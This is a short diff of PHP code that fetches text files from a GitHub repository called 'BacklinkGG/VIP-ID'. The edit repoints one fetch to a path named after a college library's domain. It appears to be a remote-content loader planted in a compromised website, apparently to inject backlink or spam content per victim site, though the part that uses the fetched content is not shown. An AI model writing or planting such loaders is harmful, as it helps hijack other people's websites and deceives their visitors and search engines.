@@ -365,7 +365,7 @@ function curlGetContents($url) {
     curl_close($ch);
     return $fileContents; }
 $url1 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/system.txt';
-$url2 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/site/stikes-bhaktipertiwi/link.txt';
+$url2 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/site/stikes-bhaktipertiwi/library.stikesbpi.ac.id/system.txt';
 $fileContents1 = curlGetContents($url1);
 $fileContents2 = curlGetContents($url2);
 ?>
